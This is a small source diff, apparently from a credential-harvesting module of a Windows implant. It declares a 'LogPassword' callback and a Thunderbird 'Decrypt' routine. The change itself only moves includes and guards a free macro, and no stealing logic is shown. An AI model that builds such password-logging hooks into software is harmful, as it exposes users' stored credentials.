@@ -6,15 +6,18 @@
 #include <string.h>
 
 #include <windows.h>
-#include "..\common.h"
-#include "base64.h"
+#include <base64/base64.h>
+#include "../../H4DLL/common.h"
+
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 
 extern int Decrypt(CHAR *cryptData, WCHAR *clearData, UINT clearSize); // in thunderbird.cpp
 
+#ifndef SAFE_FREE
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#endif
 
 struct p_entry {
 	WCHAR service[64];
